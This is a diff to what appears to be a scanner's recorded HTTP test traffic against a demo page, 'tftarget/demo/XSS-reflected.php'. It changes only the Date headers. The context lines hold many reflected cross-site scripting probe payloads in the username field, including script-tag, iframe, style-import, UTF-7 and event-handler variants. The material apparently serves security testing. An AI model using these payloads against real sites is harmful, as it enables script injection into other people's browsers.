@@ -15830,7 +15830,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15863,7 +15863,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=&gt;'&gt;&lt;script&gt;alert(26976)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 261
-Date: Mon, 15 Sep 2014 14:48:38 GMT
+Date: Mon, 1 Dec 2014 14:48:38 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15904,7 +15904,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15937,7 +15937,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=&gt;"&gt;&lt;script&gt;alert(26978)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 261
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -15978,7 +15978,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16011,7 +16011,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=&gt;'&gt;&lt;%00script&gt;alert(26980)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 262
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16052,7 +16052,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16085,7 +16085,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=&gt;"&gt;&lt;%00script&gt;alert(26982)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 262
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16126,7 +16126,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16159,7 +16159,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username="&gt;&lt;/STYLE&gt;&lt;STYLE&gt;@import"javascript:alert(26984)";&lt;/STYLE&gt;
 HTTP/1.1 200 OK
 Content-Length: 287
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16200,7 +16200,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16233,7 +16233,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username="&gt;&lt;/IFRAME&gt;&lt;script&gt;alert(26986)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 269
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16274,7 +16274,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16307,7 +16307,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username="&gt;&lt;/style&gt;&lt;script&gt;alert(26988)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 268
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16348,7 +16348,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16381,7 +16381,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username="&gt;&lt;/title&gt;&lt;script&gt;alert(26990)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 268
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16422,7 +16422,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16455,7 +16455,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=%27%22%3E%3Ciframe+src%3Djavascript%3Aalert%2826992%29%3E
 HTTP/1.1 200 OK
 Content-Length: 268
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16496,7 +16496,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16529,7 +16529,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=%27%22%3E%3Cscript%3Ealert(26996)%3C%2Fscript%3E
 HTTP/1.1 200 OK
 Content-Length: 261
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16570,7 +16570,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16603,7 +16603,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=&lt;/TextArea&gt;&lt;script&gt;alert(27000)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 269
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16644,7 +16644,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16677,7 +16677,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=%3E%2BACJ-%2BAD4APB-SCRIPT%2FTYPE%3DTEXT%2FVBSCRIPT%2BAD7-MSGBOX%28123%29%2BAA0APB-%2FSCRIPT%2BAD7-
 HTTP/1.1 200 OK
 Content-Length: 304
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16718,7 +16718,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16751,7 +16751,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=%27%22&gt;&lt;A%20HREF=Link%20onMouseOver=alert(27012)&gt;HoverMe&lt;/A&gt;
 HTTP/1.1 200 OK
 Content-Length: 281
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16792,7 +16792,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16825,7 +16825,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=*/--&gt;&lt;/script&gt;&lt;script&gt;alert(27026)&lt;/script&gt;
 HTTP/1.1 200 OK
 Content-Length: 272
-Date: Mon, 15 Sep 2014 14:48:39 GMT
+Date: Mon, 1 Dec 2014 14:48:39 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16871,7 +16871,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16904,7 +16904,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=%27%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fdemo.testfire.net%3E
 HTTP/1.1 200 OK
 Content-Length: 269
-Date: Mon, 15 Sep 2014 14:48:40 GMT
+Date: Mon, 1 Dec 2014 14:48:40 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16950,7 +16950,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -16983,7 +16983,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=%22%27%3E%3CIMG+SRC%3D%22%2FWF_XSRF.html%22%3E
 HTTP/1.1 200 OK
 Content-Length: 257
-Date: Mon, 15 Sep 2014 14:48:40 GMT
+Date: Mon, 1 Dec 2014 14:48:40 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17015,7 +17015,7 @@ Referer: http://tftarget/demo/XSS-reflected2.php
 
 HTTP/1.1 404 Not Found
 Content-Length: 210
-Date: Mon, 15 Sep 2014 14:48:40 GMT
+Date: Mon, 1 Dec 2014 14:48:40 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html; charset=iso-8859-1
@@ -17049,7 +17049,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -17090,7 +17090,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 900
-Date: Mon, 15 Sep 2014 14:44:46 GMT
+Date: Mon, 1 Dec 2014 14:44:46 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
 ETag: "2000000023431-384-4a54837b0b761"
@@ -17146,7 +17146,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 608
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17186,7 +17186,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 608
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17238,7 +17238,7 @@ Referer: http://tftarget/demo/XSS.php
 
 HTTP/1.1 200 OK
 Content-Length: 489
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17273,7 +17273,7 @@ Referer: http://tftarget/demo/XSS.php
 
 HTTP/1.1 200 OK
 Content-Length: 489
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17322,7 +17322,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17355,7 +17355,7 @@ Referer: http://tftarget/demo/XSS-reflected.php
 username=
 HTTP/1.1 200 OK
 Content-Length: 229
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17398,7 +17398,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 375
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17430,7 +17430,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 375
-Date: Mon, 15 Sep 2014 14:48:41 GMT
+Date: Mon, 1 Dec 2014 14:48:41 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17474,7 +17474,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 147
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17493,7 +17493,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 147
-Date: Mon, 15 Sep 2014 14:48:41 GMT
+Date: Mon, 1 Dec 2014 14:48:41 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17524,7 +17524,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 297
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html;charset=UTF-8
@@ -17551,7 +17551,7 @@ Referer: http://tftarget/demo/
 
 HTTP/1.1 200 OK
 Content-Length: 297
-Date: Mon, 15 Sep 2014 14:48:41 GMT
+Date: Mon, 1 Dec 2014 14:48:41 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html;charset=UTF-8
@@ -17590,7 +17590,7 @@ Referer: http://tftarget/demo/XSS.php
 
 HTTP/1.1 200 OK
 Content-Length: 923
-Date: Mon, 15 Sep 2014 14:44:47 GMT
+Date: Mon, 1 Dec 2014 14:44:47 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17633,7 +17633,7 @@ Referer: http://tftarget/demo/XSS.php
 
 HTTP/1.1 200 OK
 Content-Length: 923
-Date: Mon, 15 Sep 2014 14:48:41 GMT
+Date: Mon, 1 Dec 2014 14:48:41 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 X-Powered-By: PHP/5.3.6
 Connection: close
@@ -17687,7 +17687,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 279
-Date: Mon, 15 Sep 2014 14:49:23 GMT
+Date: Mon, 1 Dec 2014 14:49:23 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Connection: close
 Content-Type: text/html;charset=UTF-8
@@ -17713,7 +17713,7 @@ Host: tftarget
 
 HTTP/1.1 200 OK
 Content-Length: 226
-Date: Mon, 15 Sep 2014 14:49:26 GMT
+Date: Mon, 1 Dec 2014 14:49:26 GMT
 Server: Apache/2.2.19 (Win32) PHP/5.3.6
 Last-Modified: Wed, 01 Jun 2011 19:59:54 GMT
 ETag: "1000000023445-e2-4a4abf6cf8280"
